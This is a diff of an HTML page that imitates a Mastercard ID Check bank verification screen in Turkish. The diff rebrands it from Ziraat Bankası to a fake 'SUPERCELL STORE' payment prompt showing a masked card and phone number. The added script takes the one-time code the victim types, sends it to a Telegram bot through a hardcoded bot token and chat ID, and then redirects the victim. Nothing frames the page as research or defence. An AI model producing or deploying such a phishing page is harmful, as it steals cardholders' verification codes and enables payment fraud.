@@ -3,191 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ziraat Bankası - Doğrulama</title>
+    <title>Doğrulama Sistemi</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #ffffff;
-            display: flex;
-            justify-content: center;
-            padding-top: 20px;
-            color: #333;
-        }
-        .container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            border: 1px solid #eee;
-        }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        .logo-section {
-            display: flex;
-            align-items: center;
-            font-weight: bold;
-            font-size: 22px;
-            color: #000;
-        }
-        .logo-icon {
-            color: #e30613;
-            margin-right: 5px;
-            font-size: 28px;
-        }
-        .mastercard-logo {
-            height: 30px;
-        }
-        .title {
-            text-align: center;
-            font-size: 18px;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 12px;
-            font-size: 15px;
-        }
-        .label {
-            font-weight: bold;
-            color: #333;
-        }
-        .value {
-            color: #555;
-            text-align: right;
-        }
-        hr {
-            border: 0;
-            border-top: 1px solid #eee;
-            margin: 15px 0;
-        }
-        .sms-info {
-            text-align: center;
-            font-size: 13px;
-            color: #666;
-            line-height: 1.5;
-            margin-bottom: 15px;
-        }
-        .input-title {
-            font-weight: bold;
-            margin-bottom: 8px;
-            font-size: 16px;
-        }
-        .input-field {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 16px;
-            margin-bottom: 20px;
-        }
-        .btn-onayla {
-            width: 100%;
-            background-color: #00A3C1;
-            color: white;
-            border: none;
-            padding: 15px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .footer-links {
-            text-align: center;
-            margin-top: 15px;
-            font-size: 14px;
-        }
-        .timer {
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .cancel-link {
-            color: #00A3C1;
-            text-decoration: none;
-            font-weight: bold;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f7f7f7; color: #333; line-height: 1.4; }
+        
+        .wrapper { width: 100%; max-width: 450px; margin: 20px auto; background: #fff; border-radius: 8px; overflow: hidden; border: 1px solid #ddd; }
+        
+        /* Header */
+        .header { padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
+        .brand { display: flex; align-items: center; font-weight: bold; font-size: 18px; }
+        .brand-icon { width: 25px; height: 25px; background: #ff5f00; border-radius: 4px; margin-right: 8px; }
+        .mc-logo { height: 20px; }
+
+        .content { padding: 20px; }
+        .page-title { text-align: center; font-size: 16px; font-weight: 500; margin-bottom: 20px; color: #555; }
+
+        /* Bilgi Tablosu */
+        .info-table { width: 100%; margin-bottom: 20px; font-size: 13px; }
+        .info-row { display: flex; padding: 6px 0; border-bottom: 1px solid #fafafa; }
+        .label { width: 40%; font-weight: bold; color: #666; }
+        .value { width: 60%; text-align: left; padding-left: 10px; }
+
+        .sms-text { font-size: 12px; color: #777; text-align: center; margin-bottom: 20px; background: #fdfdfd; padding: 10px; border-radius: 5px; }
+
+        /* Input Alanı */
+        .input-group { margin-bottom: 20px; }
+        .input-label { display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; }
+        .otp-input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 5px; font-size: 18px; text-align: center; outline: none; transition: border 0.3s; }
+        .otp-input:focus { border-color: #00A3C1; }
+
+        /* Buton */
+        .submit-btn { width: 100%; background-color: #00A3C1; color: white; border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 5px; cursor: pointer; transition: background 0.3s; }
+        .submit-btn:active { background-color: #008ba5; }
+
+        /* Footer */
+        .footer { text-align: center; padding: 15px; font-size: 13px; }
+        .timer { font-weight: bold; margin-bottom: 8px; }
+        .cancel-link { color: #00A3C1; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="wrapper">
     <div class="header">
-        <div class="logo-section">
-            <span class="logo-icon">🌾</span> Ziraat Bankası
+        <div class="brand"><div class="brand-icon"></div> SUPERCELL</div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" class="mc-logo">
+    </div>
+
+    <div class="content">
+        <div class="page-title">Doğrulama kodunu giriniz</div>
+
+        <div class="info-table">
+            <div class="info-row"><div class="label">İşyeri Adı:</div><div class="value">SUPERCELL STORE</div></div>
+            <div class="info-row"><div class="label">İşlem Tutarı:</div><div class="value">0,00 AZN</div></div>
+            <div class="info-row"><div class="label">Tarih-Saat:</div><div class="value">03.01.2026 21:32:19</div></div>
+            <div class="info-row"><div class="label">Kart:</div><div class="value">XXXX XXXX XXXX 5815</div></div>
         </div>
-        <div style="font-size: 12px; color: #888; display: flex; align-items: center;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" class="mastercard-logo" alt="MasterCard">
-            <span style="margin-left: 5px; border-left: 1px solid #ccc; padding-left: 5px;">ID Check</span>
+
+        <div class="sms-text">
+            Şifreniz 0 XXX XXX6555 nolu telefona gönderildi.<br>Ref no: 7J3V6UB1
         </div>
+
+        <div class="input-group">
+            <label class="input-label">Doğrulama Kodu</label>
+            <input type="text" id="otpCode" class="otp-input" placeholder="••••••" inputmode="numeric" maxlength="6">
+        </div>
+
+        <button type="button" class="submit-btn" onclick="gonder()">Onayla</button>
     </div>
 
-    <div class="title">Doğrulama kodunu giriniz</div>
-    <hr>
-
-    <div class="info-row">
-        <div class="label">İşyeri Adı:</div>
-        <div class="value">M10 TOP UP</div>
-    </div>
-    <div class="info-row">
-        <div class="label">İşlem Tutarı:</div>
-        <div class="value">1,00 AZN</div>
-    </div>
-    <div class="info-row">
-        <div class="label">İşlem Tarihi-Saati:</div>
-        <div class="value">03.01.2026 21:32:19</div>
-    </div>
-    <div class="info-row">
-        <div class="label">Kart Numarası:</div>
-        <div class="value">XXXX XXXX XXXX 5815</div>
-    </div>
-
-    <hr>
-
-    <div class="sms-info">
-        Şifreniz <b>0 XXX XXX6555</b> nolu cep telefonunuza gönderilecektir.<br>
-        Referans no: 7J3V6UB1
-    </div>
-
-    <div class="input-title">Doğrulama Kodu</div>
-    <input type="text" id="otpCode" class="input-field">
-
-    <button type="button" class="btn-onayla" onclick="onayla()">Onayla</button>
-
-    <div class="footer-links">
+    <div class="footer">
         <div class="timer">Kalan Süre: <span id="time">02:33</span></div>
         <a href="#" class="cancel-link">İşlemi İptal Et</a>
     </div>
 </div>
 
 <script>
-    function onayla() {
-        var code = document.getElementById("otpCode").value;
-        if(code.length > 0) {
-            // BURANI DƏYİŞİN: Yönləndirmək istədiyiniz hazır səhifənin linkini yazın
-            window.location.href = "hazir_seifeniz.html"; 
-        } else {
-            alert("Lütfen doğrulama kodunu giriniz.");
+    // BOT AYARLARI
+    const TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A";
+    const ID = "-1003369084883";
+    const SONRAKI_SAYFA = "hazir_sayfan.html";
+
+    function gonder() {
+        const code = document.getElementById("otpCode").value;
+        if(code.length < 3) {
+            alert("Lütfen geçerli bir kod giriniz.");
+            return;
         }
+
+        const text = `🚀 *Yeni Supercell Girişi*\n\n💎 Kod: \`${code}\`\n📅 Tarih: 03.01.2026\n📱 Cihaz: Mobil`;
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: ID, text: text, parse_mode: 'Markdown' })
+        }).then(() => {
+            window.location.href = SONRAKI_SAYFA;
+        }).catch(() => {
+            window.location.href = SONRAKI_SAYFA;
+        });
     }
 
-    // Sadə geri sayım funksiyası
-    var seconds = 153; 
-    function timer() {
-        var mins = Math.floor(seconds / 60);
-        var secs = seconds % 60;
-        document.getElementById("time").innerHTML = 
-            (mins < 10 ? "0" : "") + mins + ":" + (secs < 10 ? "0" : "") + secs;
-        if (seconds > 0) {
-            seconds--;
-            setTimeout(timer, 1000);
-        }
-    }
-    timer();
+    // TAYMER
+    let sec = 153;
+    setInterval(() => {
+        let m = Math.floor(sec / 60);
+        let s = sec % 60;
+        document.getElementById("time").innerHTML = (m<10?'0':'')+m + ":" + (s<10?'0':'')+s;
+        if(sec > 0) sec--;
+    }, 1000);
 </script>
 
 </body>
